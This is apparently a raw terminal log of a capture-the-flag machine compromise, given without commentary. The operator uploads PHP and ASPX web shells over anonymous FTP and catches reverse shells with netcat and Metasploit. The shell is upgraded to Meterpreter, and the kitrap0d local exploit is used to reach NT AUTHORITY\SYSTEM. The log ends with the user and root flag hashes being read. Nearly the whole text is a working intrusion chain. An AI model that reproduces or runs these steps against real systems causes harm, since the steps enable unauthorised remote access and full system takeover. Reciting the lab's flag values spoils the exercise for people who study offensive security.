hippoeug@kali:~$ ftp 10.129.135.184
Connected to 10.129.135.184.
220 Microsoft FTP Service
Name (10.129.135.184:hippoeug): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> put shell.php
local: shell.php remote: shell.php
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
5676 bytes sent in 0.00 secs (27.2013 MB/s)
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
04-25-21  05:03PM                 5676 shell.php
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
ftp> 






hippoeug@kali:~$ ftp 10.129.135.184
Connected to 10.129.135.184.
220 Microsoft FTP Service
Name (10.129.135.184:hippoeug): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> put shell.aspx
local: shell.aspx remote: shell.aspx
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
15855 bytes sent in 0.00 secs (55.5901 MB/s)
ftp> ls
200 PORT command successful.
150 Opening ASCII mode data connection.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
04-25-21  05:07PM                15855 shell.aspx
04-25-21  05:03PM                 5676 shell.php
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
ftp> 






hippoeug@kali:~$ nc -lnvp 4545
listening on [any] 4545 ...
connect to [10.10.14.6] from (UNKNOWN) [10.129.135.184] 49157
Spawn Shell...
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>







hippoeug@kali:~$ msfconsole
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > set lhost 10.10.14.6
lhost => 10.10.14.6
msf6 exploit(multi/handler) > set lport 4545
lport => 4545
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.6:4545 
[*] Command shell session 1 opened (10.10.14.6:4545 -> 10.129.135.184:49158) at 2021-04-25 22:09:45 +0800

Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>








privilege escalation
===
c:\windows\system32\inetsrv>background

Background session 1? [y/N]  y
msf6 exploit(multi/handler) > back
msf6 > use post/multi/manage/shell_to_meterpreter
msf6 post(multi/manage/shell_to_meterpreter) > show options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on.

msf6 post(multi/manage/shell_to_meterpreter) > sessions -l

Active sessions
===============

  Id  Name  Type             Information     Connection
  --  ----  ----             -----------     ----------
  1         shell sparc/bsd  Spawn Shell...  10.10.14.6:4545 -> 10.129.135.184:49158 (10.129.135.184)

msf6 post(multi/manage/shell_to_meterpreter) > set session 1
session => 1
msf6 post(multi/manage/shell_to_meterpreter) > set lhost 10.10.14.6
lhost => 10.10.14.6
msf6 post(multi/manage/shell_to_meterpreter) > run

[*] Upgrading session ID: 1
[-] Shells on the target platform, bsd, cannot be upgraded to Meterpreter at this time.
[*] Post module execution completed
msf6 post(multi/manage/shell_to_meterpreter) > 









msf6 > use exploit/windows/local/bypassuac
[*] Using configured payload windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/bypassuac) > show options

Module options (exploit/windows/local/bypassuac):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   SESSION                     yes       The session to run this module on.
   TECHNIQUE  EXE              yes       Technique to use if UAC is turned off (Accepted: PSH, EXE)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.6       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86


msf6 exploit(windows/local/bypassuac) > sessions -l

Active sessions
===============

  Id  Name  Type             Information     Connection
  --  ----  ----             -----------     ----------
  1         shell sparc/bsd  Spawn Shell...  10.10.14.6:4545 -> 10.129.135.184:49158 (10.129.135.184)

msf6 exploit(windows/local/bypassuac) > set session 1
session => 1
msf6 exploit(windows/local/bypassuac) > set lhost 10.10.14.6
lhost => 10.10.14.6
msf6 exploit(windows/local/bypassuac) > set lport 4433
lport => 4433
msf6 exploit(windows/local/bypassuac) > run

[!] SESSION may not be compatible with this module.
[*] Started reverse TCP handler on 10.10.14.6:4433 
[-] Exploit aborted due to failure: none: Already in elevated state
[*] Exploit completed, but no session was created.








msf6 > sessions -l

Active sessions
===============

  Id  Name  Type             Information     Connection
  --  ----  ----             -----------     ----------
  1         shell sparc/bsd  Spawn Shell...  10.10.14.6:4545 -> 10.129.135.184:49158 (10.129.135.184)








PART 7 FIXING ERR
=============


msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/shell/reverse_tcp
payload => windows/shell/reverse_tcp
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/shell/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.6       yes       The listen address (an interface may be specified)
   LPORT     4545             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.6:4545 
[*] Encoded stage with x86/shikata_ga_nai
[*] Sending encoded stage (267 bytes) to 10.129.135.184
[*] Command shell session 2 opened (10.10.14.6:4545 -> 10.129.135.184:49159) at 2021-04-25 22:20:15 +0800


More? 

'' is not recognized as an internal or external command,
operable program or batch file.

c:\windows\system32\inetsrv>background

Background session 2? [y/N]  y
msf6 exploit(multi/handler) > sessions -l

Active sessions
===============

  Id  Name  Type               Information                                                                       Connection
  --  ----  ----               -----------                                                                       ----------
  2         shell x86/windows  Spawn Shell... Microsoft Windows [Version 6.1.7600] Copyright (c) 2009 Micros...  10.10.14.6:4545 -> 10.129.135.184:49159 (10.129.135.184)

msf6 exploit(multi/handler) > back
msf6 > use post/multi/manage/shell_to_meterpreter
msf6 post(multi/manage/shell_to_meterpreter) > show options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST    10.10.14.6       no        IP of host that will receive the connection from the payload (Will try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION  1                yes       The session to run this module on.

msf6 post(multi/manage/shell_to_meterpreter) > set session 2
session => 2
msf6 post(multi/manage/shell_to_meterpreter) > exploit

[*] Upgrading session ID: 2
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.10.14.6:4433 
[*] Post module execution completed
msf6 post(multi/manage/shell_to_meterpreter) > 
[*] Sending stage (175174 bytes) to 10.129.135.184
[*] Meterpreter session 3 opened (10.10.14.6:4433 -> 10.129.135.184:49160) at 2021-04-25 22:24:04 +0800
[*] Stopping exploit/multi/handler

msf6 post(multi/manage/shell_to_meterpreter) > sessions -l

Active sessions
===============

  Id  Name  Type                     Information                                                                       Connection
  --  ----  ----                     -----------                                                                       ----------
  2         shell x86/windows        Spawn Shell... Microsoft Windows [Version 6.1.7600] Copyright (c) 2009 Micros...  10.10.14.6:4545 -> 10.129.135.184:49159 (10.129.135.184)
  3         meterpreter x86/windows  IIS APPPOOL\Web @ DEVEL                                                           10.10.14.6:4433 -> 10.129.135.184:49160 (10.129.135.184)

msf6 post(multi/manage/shell_to_meterpreter) > session -i 3
[-] Unknown command: session.
msf6 post(multi/manage/shell_to_meterpreter) > sessions -i 3
[*] Starting interaction with 3...

meterpreter > getsystem
[-] priv_elevate_getsystem: Operation failed: This function is not supported on this system. The following was attempted:
[-] Named Pipe Impersonation (In Memory/Admin)
[-] Named Pipe Impersonation (Dropper/Admin)
[-] Token Duplication (In Memory/Admin)
[-] Named Pipe Impersonation (RPCSS variant)
meterpreter > getuid
Server username: IIS APPPOOL\Web
meterpreter > run post/multi/recon/local_exploit_suggester

[*] 10.129.135.184 - Collecting local exploits for x86/windows...
[*] 10.129.135.184 - 37 exploit checks are being tried...
[+] 10.129.135.184 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
nil versions are discouraged and will be deprecated in Rubygems 4
[+] 10.129.135.184 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.129.135.184 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.129.135.184 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.129.135.184 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.129.135.184 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.129.135.184 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
[+] 10.129.135.184 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.129.135.184 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.129.135.184 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 10.129.135.184 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.129.135.184 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.129.135.184 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
meterpreter > use exploit/windows/local/ms_10_015_kitrap0d
Loading extension exploit/windows/local/ms_10_015_kitrap0d...
[-] Failed to load extension: Unable to load extension 'exploit/windows/local/ms_10_015_kitrap0d' - module does not exist.
meterpreter > use exploit/windows/local/ms10_015_kitrap0d
Loading extension exploit/windows/local/ms10_015_kitrap0d...
[-] Failed to load extension: Unable to load extension 'exploit/windows/local/ms10_015_kitrap0d' - module does not exist.
meterpreter > back
[-] Unknown command: back.
meterpreter > background
[*] Backgrounding session 3...
msf6 post(multi/manage/shell_to_meterpreter) > back
msf6 > use exploit/windows/local/ms10_015_kitrap0d
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/ms10_015_kitrap0d) > show options

Module options (exploit/windows/local/ms10_015_kitrap0d):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.204.129  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 2K SP4 - Windows 7 (x86)


msf6 exploit(windows/local/ms10_015_kitrap0d) > 


msf6 exploit(windows/local/ms10_015_kitrap0d) > set lhost 10.10.14.6
lhost => 10.10.14.6
msf6 exploit(windows/local/ms10_015_kitrap0d) > set lport 2121
lport => 2121
msf6 exploit(windows/local/ms10_015_kitrap0d) > set session 3
session => 3
msf6 exploit(windows/local/ms10_015_kitrap0d) > run

[*] Started reverse TCP handler on 10.10.14.6:2121 
[*] Launching notepad to host the exploit...
[+] Process 1748 launched.
[*] Reflectively injecting the exploit DLL into 1748...
[*] Injecting exploit into 1748 ...
[*] Exploit injected. Injecting payload into 1748...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (175174 bytes) to 10.129.135.184
[*] Meterpreter session 4 opened (10.10.14.6:2121 -> 10.129.135.184:49161) at 2021-04-25 22:29:27 +0800

meterpreter > sessions -i 4
Usage: sessions <id>

Interact with a different session Id.
This works the same as calling this from the MSF shell: sessions -i <session id>

meterpreter > whoami
[-] Unknown command: whoami.
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sessions -l
Usage: sessions <id>

Interact with a different session Id.
This works the same as calling this from the MSF shell: sessions -i <session id>

meterpreter > background
[*] Backgrounding session 4...
msf6 exploit(windows/local/ms10_015_kitrap0d) > sessions -l

Active sessions
===============

  Id  Name  Type                     Information                                                                       Connection
  --  ----  ----                     -----------                                                                       ----------
  2         shell x86/windows        Spawn Shell... Microsoft Windows [Version 6.1.7600] Copyright (c) 2009 Micros...  10.10.14.6:4545 -> 10.129.135.184:49159 (10.129.135.184)
  3         meterpreter x86/windows  IIS APPPOOL\Web @ DEVEL                                                           10.10.14.6:4433 -> 10.129.135.184:49160 (10.129.135.184)
  4         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ DEVEL                                                       10.10.14.6:2121 -> 10.129.135.184:49161 (10.129.135.184)

msf6 exploit(windows/local/ms10_015_kitrap0d) > sessions -i 4
[*] Starting interaction with 4...

meterpreter > ls






meterpreter > pwd
c:\
meterpreter > ls
[-] Error running command ls: NoMethodError undefined method `[]' for nil:NilClass






meterpreter > shell
Process 148 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\>ls
ls
'ls' is not recognized as an internal or external command,
operable program or batch file.

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 8620-71F1

 Directory of C:\

11/06/2009  12:42 ��                24 autoexec.bat
11/06/2009  12:42 ��                10 config.sys
17/03/2017  07:33 ��    <DIR>          inetpub
14/07/2009  05:37 ��    <DIR>          PerfLogs
13/12/2020  01:59 ��    <DIR>          Program Files
18/03/2017  02:16 ��    <DIR>          Users
14/01/2021  12:48 ��    <DIR>          Windows
               2 File(s)             34 bytes
               5 Dir(s)  22.199.873.536 bytes free

C:\>






C:\Users\babis\Desktop>dir 
dir
 Volume in drive C has no label.
 Volume Serial Number is 8620-71F1

 Directory of C:\Users\babis\Desktop

18/03/2017  02:14 ��    <DIR>          .
18/03/2017  02:14 ��    <DIR>          ..
18/03/2017  02:18 ��                32 user.txt.txt
               1 File(s)             32 bytes
               2 Dir(s)  22.199.873.536 bytes free

C:\Users\babis\Desktop>type user.txt.txt
type user.txt.txt
9ecdd6a3aedf24b41562fea70f4cb3e8
C:\Users\babis\Desktop>cd ..
cd ..

C:\Users\babis>cd ..
cd ..

C:\Users>cd Administrator
cd Administrator

C:\Users\Administrator>cd Desktop
cd Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 8620-71F1

 Directory of C:\Users\Administrator\Desktop

14/01/2021  12:42 ��    <DIR>          .
14/01/2021  12:42 ��    <DIR>          ..
18/03/2017  02:17 ��                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  22.199.873.536 bytes free

C:\Users\Administrator\Desktop>type root.txt
type root.txt
e621a0b5041708797c4fc4728bc72b4b
C:\Users\Administrator\Desktop>




